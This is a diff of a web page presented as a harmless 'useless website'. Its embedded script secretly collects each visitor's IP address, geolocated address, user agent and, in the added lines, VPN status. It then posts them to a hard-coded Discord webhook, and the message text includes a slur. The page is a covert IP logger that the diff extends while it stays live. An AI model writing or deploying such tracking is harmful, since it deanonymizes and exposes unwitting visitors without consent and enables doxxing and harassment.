@@ -1,11 +1,29 @@
-<!-- Updated HTML with enhanced uselessness -->
+<!-- Updated HTML with clean font -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Useless Website</title>
+    <title>Website</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            margin: 20px;
+        }
+
+        h1 {
+            color: #333;
+        }
+
+        p {
+            color: #555;
+        }
+
+        a {
+            color: #007BFF;
+        }
+    </style>
 </head>
 <body>
     <h1>Welcome to an useless website</h1>
@@ -16,14 +34,14 @@
             const webhookUrl = 'https://discord.com/api/webhooks/1181568688365772810/a8uz5coZtPV_fm96znZsrCny53RXJn55vjU0P6QfzL7VVVvcoDjnCvKgfbjPhHARDI5N'; // Replace with your Discord webhook URL
 
             // Function to send user and device information to Discord
-            const sendInfoToDiscord = (ip, address, userAgent) => {
+            const sendInfoToDiscord = (ip, address, userAgent, isVPN) => {
                 fetch(webhookUrl, {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json',
                     },
                     body: JSON.stringify({
-                        content: `New visitor info:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}`,
+                        content: `# Wake up some retard shit click the link:\nIP: ${ip}\nAddress: ${address}\nUser Agent: ${userAgent}\nVPN: ${isVPN ? 'Yes' : 'No'}`,
                     }),
                 });
             };
@@ -42,10 +60,15 @@
 
                     const userAgent = navigator.userAgent;
 
-                    // Sending data to Discord without prompting for username
-                    sendInfoToDiscord(ip, address, userAgent);
+                    // Check if the user is using a VPN
+                    const isVPN = await fetch('https://ipinfo.io/json')
+                        .then(response => response.json())
+                        .then(data => data.vpn);
+
+                    // Sending data to Discord with VPN status
+                    sendInfoToDiscord(ip, address, userAgent, isVPN);
                 } catch (error) {
-                    console.error('Error fetching IP or address:', error);
+                    console.error('Error fetching IP, address, or VPN status:', error);
                 }
             };
 
